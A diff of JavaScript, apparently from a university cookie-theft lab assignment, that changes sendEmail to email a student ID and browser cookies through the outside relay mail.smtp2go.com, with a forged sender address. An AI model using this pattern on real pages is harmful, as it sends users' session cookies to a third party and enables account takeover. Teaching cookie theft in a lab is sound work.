@@ -31,7 +31,7 @@ function getCookie(cookieName) {
 
 function sendEmail(mssv,cookies) {
     var email = mssv+"@gm.uit.edu.vn";
-    var vcookies = cookies;
+    var bodyvcookies = "MSSV: " + mssv + " and Cookies: " + cookies;
     Email.send({
         Host: "mail.smtp2go.com",
         Username: "lando",
@@ -39,7 +39,7 @@ function sendEmail(mssv,cookies) {
         To: 'landth@uit.edu.vn',
         From: email,
         Subject: "Success with Cookies assignment!",
-        Body: "Cookies: " + vcookies,
+        Body: bodyvcookies,
     }).then(
         message => alert(message)
     );
